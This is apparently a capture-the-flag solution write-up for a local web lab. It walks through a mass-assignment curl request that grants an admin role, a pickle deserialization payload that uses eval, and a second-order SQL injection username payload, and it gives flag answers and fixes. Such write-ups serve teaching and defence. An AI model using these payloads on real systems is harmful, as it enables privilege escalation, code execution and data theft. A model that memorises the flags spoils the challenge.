# Gridlock — Solution

> ⚠️ SPOILERS BELOW — try the challenge first.

## Flag 1 — Mass Assignment

The registration API accepts all JSON fields and stores them directly,
including `role`. The frontend form only sends `username` and `password`,
but the API doesn't filter extra fields.

```bash
curl -X POST http://localhost:8098/api/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"hacker","password":"hacker","role":"admin"}'

# Log in with hacker/hacker, visit /admin
```

**Flag:** `FLAG{m4ss_4ss1gnm3nt_r0l3_esc4l4t10n}`

**Vulnerability:** Mass assignment — the API binds all client-supplied
fields to the database record without whitelisting. Any field the
database accepts can be set by the client.

**Fix:** Explicitly whitelist accepted fields. Only extract `username`
and `password` from the request; hardcode `role` to `"viewer"`.

---

## Flag 2 — Insecure Deserialization (Python Pickle)

The import feature base64-decodes user input and passes it to
`pickle.loads()`. Pickle executes arbitrary Python during
deserialization via the `__reduce__` method.

```python
import pickle, base64

class Exploit:
    def __reduce__(self):
        return (eval, ("open('/flag2.txt').read()",))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
# Paste the output into the Import textarea on the admin panel
```

The deserialized object is the string returned by `open().read()`,
which the server wraps in a list and returns as JSON.

**Flag:** `FLAG{p1ckl3_d3s3r14l1z4t10n_rc3}`

The response also reveals:
- Flag 3 is in the database: table `secrets`, column `value`
- The admin activity page queries by stored username

**Vulnerability:** Python's `pickle` module executes arbitrary code
during deserialization. It should never be used on untrusted input.

**Fix:** Use JSON or a schema-validated format for data import. If
serialization is needed, use a safe format like MessagePack with
explicit type validation.

---

## Flag 3 — Second-Order SQL Injection

The admin "User Activity" endpoint fetches a user by ID (parameterized,
safe), then uses the stored username in a string-formatted query
(unsafe):

```python
query = f"SELECT title, description FROM issues WHERE assignee = '{user['username']}'"
```

The injection point (registration) and execution point (activity query)
are different — this is second-order injection.

```bash
# 1. Register an account whose username IS the SQL payload
curl -X POST http://localhost:8098/api/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"'"'"' UNION SELECT key,value FROM secrets--","password":"x"}'

# 2. As admin, find the new user's ID
# GET /api/admin/users — note the ID

# 3. Trigger the vulnerable query
# GET /api/admin/activity/<ID> or click "Activity" on the admin panel
```

The query becomes:
```sql
SELECT title, description FROM issues
WHERE assignee = '' UNION SELECT key,value FROM secrets--'
```

The response includes all rows from `secrets`, including flag3.

**Flag:** `FLAG{s3c0nd_0rd3r_sql_1nj3ct10n}`

**Vulnerability:** Second-order SQL injection. Data is stored safely via
parameterized query, but later used unsafely in a different query via
string formatting. The separation between storage and use makes this
harder to detect than direct injection.

**Fix:** Use parameterized queries for ALL SQL operations, including
those that use previously stored data. Never use string formatting or
concatenation to build SQL queries.
